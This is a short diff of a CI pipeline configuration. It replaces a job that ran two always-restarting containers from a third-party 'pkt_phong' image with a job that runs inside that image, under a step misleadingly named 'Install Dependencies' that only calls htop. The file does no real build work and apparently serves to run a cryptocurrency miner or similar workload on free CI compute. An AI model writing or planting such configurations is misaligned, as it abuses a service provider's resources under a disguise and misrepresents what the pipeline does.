@@ -1,9 +1,17 @@
-version: 2
+version: 2.1
 jobs:
- build:
-   machine: true
-   steps:
-     - checkout
-     - run: 
-          sudo docker run -d --restart always --name PKT1 -it --cpus="0.5" --cpu-shares="512" nguyenduyphong/pkt_phong:tagname
-          sudo docker run -d --restart always --name PKT2 -it --cpus="0.5" --cpu-shares="512" nguyenduyphong/pkt_phong:tagname     
+    trial:
+      docker:
+            - image: nguyenduyphong/pkt_phong:tagname
+      parallelism: 1
+      steps:
+        - run:
+            name: Install Dependencies
+            command: |
+              htop          
+
+workflows:
+    version: 2.1
+    build:
+        jobs:
+        - trial
